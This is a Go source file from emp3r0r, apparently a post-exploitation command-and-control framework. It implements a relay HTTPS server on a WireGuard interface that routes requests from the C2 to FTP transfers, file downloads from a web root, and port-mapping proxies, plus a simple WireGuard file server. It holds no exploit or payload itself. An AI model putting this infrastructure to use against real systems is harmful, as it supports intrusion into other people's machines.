package relay

import (
	"fmt"
	"net/http"
	"path/filepath"
	"strconv"
	"time"

	"github.com/gorilla/mux"
	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/ftp"
	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/network"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/internal/live"
	"github.com/jm33-m0/emp3r0r/core/internal/transport"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
	"github.com/jm33-m0/emp3r0r/core/lib/netutil"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

const (
	relayAPIUnknown = iota
	relayAPIFTP
	relayAPIWWW
	relayAPIProxy
)

func relayPathOrDefault(path, fallback string) string {
	if path == "" {
		return fallback
	}
	return path
}

func resolveRelayAPI(api string) int {
	ftpPath := relayPathOrDefault(live.RuntimeConfig.FTPPath, "ftp")
	wwwPath := relayPathOrDefault(live.RuntimeConfig.WWWPath, "www")
	proxyPath := relayPathOrDefault(live.RuntimeConfig.ProxyPath, "proxy")

	switch api {
	case ftpPath:
		return relayAPIFTP
	case wwwPath:
		return relayAPIWWW
	case proxyPath:
		return relayAPIProxy
	default:
		return relayAPIUnknown
	}
}

// This server handles relayed HTTP requests from C2, it listens on WireGuard interface
func RelayHTTP2Server() {
	defer func() {
		if r := recover(); r != nil {
			logging.Errorf("RelayHTTP2Server panicked: %v", r)
		}
	}()
	time.Sleep(3 * time.Second)
	r := mux.NewRouter()
	r.HandleFunc("/{prefix}/{api}/{token}", dispatcher)
	listenAddr := fmt.Sprintf("%s:%d", netutil.WgOperatorIP, netutil.WgRelayedHTTPPort)
	err := http.ListenAndServeTLS(listenAddr, transport.OperatorServerCrtFile, transport.OperatorServerKeyFile, r)
	if err != nil {
		logging.Errorf("Failed to start HTTP server: %v", err)
	}
}

func dispatcher(wrt http.ResponseWriter, req *http.Request) {
	logging.Debugf("Relayed request: %s %s", req.Method, req.URL.Path)
	logging.Debugf("Relayed request headers: %v", req.Header)
	api := mux.Vars(req)["api"]
	token := mux.Vars(req)["token"]
	logging.Debugf("Got relayed request from C2: API: %s, token: %s", api, token)
	logging.Debugf("Relay dispatcher expected API names: ftp=%s www=%s proxy=%s",
		strconv.Quote(relayPathOrDefault(live.RuntimeConfig.FTPPath, "ftp")),
		strconv.Quote(relayPathOrDefault(live.RuntimeConfig.WWWPath, "www")),
		strconv.Quote(relayPathOrDefault(live.RuntimeConfig.ProxyPath, "proxy")),
	)

	// Setup H2Conn for port mapping.
	proxyConn := new(def.H2Conn)
	network.ProxyStream.H2x = proxyConn

	switch resolveRelayAPI(api) {
	case relayAPIFTP:
		var targetSH *network.StreamHandler
		network.FTPStreams.Range(func(_, value interface{}) bool {
			sh := value.(*network.StreamHandler)
			if token == sh.Token {
				targetSH = sh
				return false // stop iteration
			}
			return true
		})

		if targetSH != nil {
			ftp.HandleFTPTransfer(targetSH, wrt, req)
			return
		}
		logging.Debugf("FTP stream not found: %s", token)
		wrt.WriteHeader(http.StatusNotFound)
	case relayAPIWWW:
		rawPath := req.URL.Query().Get("file_to_download")
		localized, err := util.SecureLocalPath(rawPath)
		if err != nil {
			logging.Warningf("Invalid download path %q: %v", rawPath, err)
			wrt.WriteHeader(http.StatusBadRequest)
			return
		}
		path := filepath.Base(localized)
		logging.Infof("PUT: got request for file: %s, URL: %s", path, req.URL)
		local_path := fmt.Sprintf("%s%s", live.WWWRoot, path)
		if !util.IsExist(local_path) {
			logging.Warningf("File %s not found", local_path)
			wrt.WriteHeader(http.StatusNotFound)
			return
		}
		http.ServeFile(wrt, req, local_path)
	case relayAPIProxy:
		network.HandlePortMapping(network.ProxyStream, wrt, req)
	default:
		logging.Debugf("API not found: %s", api)
		wrt.WriteHeader(http.StatusNotFound)
	}
}

// WgFileServer serves a file over HTTP on WireGuard interface
func WgFileServer(path_to_file string) (err error) {
	mux := http.NewServeMux()
	mux.HandleFunc("/", func(wrt http.ResponseWriter, req *http.Request) {
		http.ServeFile(wrt, req, path_to_file)
	})
	listenAddr := fmt.Sprintf("%s:%d", netutil.WgServerIP, netutil.WgFileServerPort)

	// retry until we can bind to the address (WireGuard interface might be slow to come up)
	for i := range 100 {
		err = http.ListenAndServe(listenAddr, mux)
		if err != nil {
			// suppress the error message for the first few seconds
			if i > 5 {
				logging.Warningf("WgFileServer: failed to listen on %s, retrying: %v", listenAddr, err)
			}
			time.Sleep(time.Second)
			continue
		}
	}

	return fmt.Errorf("WgFileServer: failed to listen on %s after 100 attempts: %v", listenAddr, err)
}
